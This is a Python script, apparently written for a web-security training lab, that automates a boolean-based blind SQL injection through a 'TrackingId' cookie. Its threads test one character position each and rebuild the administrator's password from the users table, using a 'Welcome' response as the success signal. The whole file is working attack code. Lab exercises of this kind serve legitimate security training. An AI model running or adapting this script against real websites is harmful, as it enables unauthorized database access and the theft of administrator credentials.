#!/bin/python3

import signal
from pwn import *
import time
import pdb
import requests
import string
import threading

def sigint_handler(signal, frame):
    print("\n\n [*] Saliendo... \n")
    sys.exit(1)
#Ctrl+C
signal.signal(signal.SIGINT, sigint_handler)

if (len(sys.argv) != 2):
    log.failure("Uso: %s <url-lab>" % sys.argv[0])
    sys.exit(1)

#Global vars
url = sys.argv[1]
data = {}
characters = string.ascii_letters + string.digits

def findChar(position, trackingIdCookie, p1, p2,s, characters_array,password):
    for char in characters:
        if char == ';' or char == '\n':
            continue
        p1.status("check character %c in %d position" % (char, position))
        payload = "' and substring((select password from users where username = 'administrator'),%d,1) = '%c' -- -" %(position,char)
        injection = trackingIdCookie + payload
        s.cookies.set('TrackingId', None)
        s.cookies.set('TrackingId', injection)
        r = s.get(url)
        if ("Welcome" in r.text):            
            characters_array.append((position,char))
            break

def atacksqli():
    p1 = log.progress("Brute Force")
    p2 = log.progress("Password")
    p1.status("Initialize brute force")
    time.sleep(2)
    s = requests.Session()
    request_inicial = s.get(url)
    cookies_init = s.cookies.get_dict()
    trackingIdCookie = cookies_init['TrackingId']
    characters_array = []
    threads = []
    password = ''
    for position in range(1,40):
        thread = threading.Thread(target=findChar,args=(position,trackingIdCookie,p1,p2,s,characters_array,password))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()
    
    sorted_by_position = sorted(characters_array, key=lambda tup: tup[0])
    for char_sorted in sorted_by_position:
        password += char_sorted[1]
    print(password)

if __name__ == "__main__":
    atacksqli()



